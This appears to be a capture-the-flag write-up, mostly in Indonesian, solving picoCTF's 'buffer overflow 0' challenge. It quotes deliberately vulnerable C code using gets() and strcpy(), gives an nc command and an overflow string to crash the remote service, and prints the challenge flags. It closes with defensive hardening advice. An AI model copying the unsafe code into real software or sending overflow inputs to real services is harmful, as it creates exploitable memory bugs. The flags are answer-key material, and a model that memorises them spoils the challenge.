# Writeup: buffer overflow 0 (Challenge ID: 257)

- Platform: CyLab Security Academy (picoCTF)
- Category: Binary Exploitation / Stack Smashing & SIGSEGV Signal Handling Exploitation
- Difficulty: Medium (diff=2)
- Author: Alex Fulton / LT 'syreal' Jones
- Event: picoCTF 2022
- Points: 100
- Flag: `academy{ov3rfl0ws_ar3nt_that_bad_1e25e28f}` (Komunitas: `CTF{ov3rfl0ws_ar3nt_that_bad_1e25e28f}`)

---

## Problem Statement & Scope

Tantangan menguji pemahaman dasar kerentanan alokasi memori tumpukan (*stack-based buffer overflow*) dan mekanisme penanganan sinyal sistem operasi (*signal handling*):
> *"Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here."*

Peserta diberikan berkas biner ELF 32-bit (`vuln`), kode sumber C pendukung (`vuln.c`), serta layanan interaktif jarak jauh berbasis TCP. Tujuan pembelajaran adalah menganalisis batas validasi array karakter lokal, merekonstruksi kondisi kegagalan memori (*segmentation fault*), dan memicu rutin pencetakan bendera melalui pemicuan sinyal SIGSEGV.

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Penggunaan Fungsi Tidak Aman Tanpa Pemeriksaan Batas (CWE-676 & CWE-120):**
   - Dalam kode sumber `vuln.c`, fungsi `gets()` dan `strcpy()` digunakan secara berurutan tanpa validasi panjang string masukan:
     ```c
     void vuln(char *input){
       char buf2[16];
       strcpy(buf2, input);
     }
     int main(int argc, char **argv){
       ...
       char buf1[100];
       gets(buf1); 
       vuln(buf1);
       ...
     }
     ```
   - Sesuai standar ISO/IEC 9899 dan manual Linux (`man gets`), fungsi `gets()` telah ditarik dari standar C11 karena tidak menerima parameter ukuran buffer. Sementara itu, `strcpy()` menyalin seluruh deretan bita hingga menemukan null byte (`0x00`), mengabaikan kapasitas buffer tujuan sebesar 16 bita.

2. **Arsitektur Stack Frame x86 32-Bit & Penimpaan Alamat Kembali (CWE-121):**
   - Ketika fungsi `vuln()` dipanggil:
     - Argumen masukan dialokasikan pada alamat tumpukan sebelum instruksi `call`.
     - Instruksi `call` mendorong alamat instruksi berikutnya (*return address* / `%eip`) ke atas stack.
     - Prolog fungsi mengeksekusi `push %ebp` untuk menyimpan pointer frame fungsi pemanggil, lalu mengalokasikan ruang lokal untuk `buf2[16]`.
   - Mengisi `buf2` melebihi kapasitas 16 bita akan meluap menimpa memori di atasnya:
     - 16 bita pertama mengisi `buf2`.
     - Bita berikutnya menimpa padding keselarasan compiler dan pointer frame `%ebp`.
     - Bita ke-24 dan seterusnya menimpa alamat kembali yang tersimpan (*saved return address*).

3. **Mekanisme Penanganan Sinyal SIGSEGV:**
   - Program mendaftarkan handler sinyal melalui pemanggilan sistem `signal(SIGSEGV, sigsegv_handler);`.
   - Ketika `vuln()` menyelesaikan eksekusi dan mengeksekusi instruksi `ret`, prosesor mencoba mengambil instruksi dari alamat memori yang telah tertimpa data sembarang (misalnya `0x41414141`).
   - Karena alamat tersebut tidak berada pada segmen memori yang valid atau dapat dieksekusi, Memory Management Unit (MMU) memicu pengecualian *page fault*, dan kernel Linux mengirimkan sinyal SIGSEGV (Signal 11).
   - Rutin penanganan sinyal `sigsegv_handler()` menangkap peristiwa tersebut lalu mencetak isi berkas `flag.txt`:
     ```c
     void sigsegv_handler(int sig) {
       printf("%s\n", flag);
       fflush(stdout);
       exit(1);
     }
     ```

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Inspeksi Proteksi Biner Bawaan:**
   - Evaluasi mitigasi menggunakan `checksec`:
     ```bash
     checksec --file=vuln
     ```
   - Hasil menunjukkan Stack Canary berstatus disabled (`No Canary found`), sehingga luapan memori tidak memicu abort internal compiler melainkan langsung merusak alur kontrol.

2. **Kalkulasi Panjang Payload Luapan:**
   - Ruang buffer tujuan adalah 16 bita.
   - Mengirimkan string masukan sepanjang 32 karakter `A` (`0x41 * 32`) cukup untuk melompati seluruh batas frame lokal dan merusak alamat instruksi `%eip`.

3. **Pengujian Terhadap Layanan Jarak Jauh (Remote Exploitation):**
   - Hubungkan soket ke instance container aktif:
     ```bash
     nc chatelaine.cylabacademy.net 35843
     ```
   - Kirimkan muatan:
     ```text
     AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
     ```
   - Server merespons dengan mengeksekusi `sigsegv_handler` dan memunculkan token bendera:
     ```text
     academy{ov3rfl0ws_ar3nt_that_bad_1e25e28f}
     ```

---

## Flag & Verifikasi

- **Flag Resmi:** `academy{ov3rfl0ws_ar3nt_that_bad_1e25e28f}`
- **Flag Komunitas:** `CTF{ov3rfl0ws_ar3nt_that_bad_1e25e28f}`
- **Bukti Validasi:** REST API CyLab `POST /api/submissions/` merespons dengan status HTTP 201 Created:
  ```json
  {"user": 1072359, "challenge": 257, "flag": "academy{ov3rfl0ws_ar3nt_that_bad_1e25e28f}", "correct": true, "historical": false}
  ```

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Sanitasi Fungsi Masukan Tingkat Rendah:**
   - Dalam pengembangan perangkat lunak aman standar LKS Cyber Security, seluruh fungsi usang seperti `gets()` dan `strcpy()` wajib dieliminasi. Gantikan dengan fungsi terikat batas (*bounded functions*) seperti `fgets(buf, sizeof(buf), stdin)` atau `strncpy(buf2, input, sizeof(buf2) - 1)` dengan penjaminan null terminator eksplisit.
2. **Pengaktifan Proteksi Kompiler Modern:**
   - Gunakan opsi proteksi `-fstack-protector-strong` atau `-fstack-protector-all` pada tahap kompilasi GCC/Clang. Canaries akan menyisipkan nilai acak tepat sebelum saved `%ebp` dan memverifikasi integritasnya sebelum fungsi kembali, menghentikan eksekusi dengan pesan `stack smashing detected`.
3. **Pemberlakuan Fortify Source:**
   - Mengaktifkan bendera `-D_FORTIFY_SOURCE=2` pada biner produksi memaksa konversi otomatis pemanggilan fungsi tidak aman menjadi varian terproteksi runtime yang mendeteksi luapan buffer secara deterministik.

---

## Solver Script

Solusi reproduktif terverifikasi tersedia pada:
`scripts/solve_257_buffer_overflow_0.py`
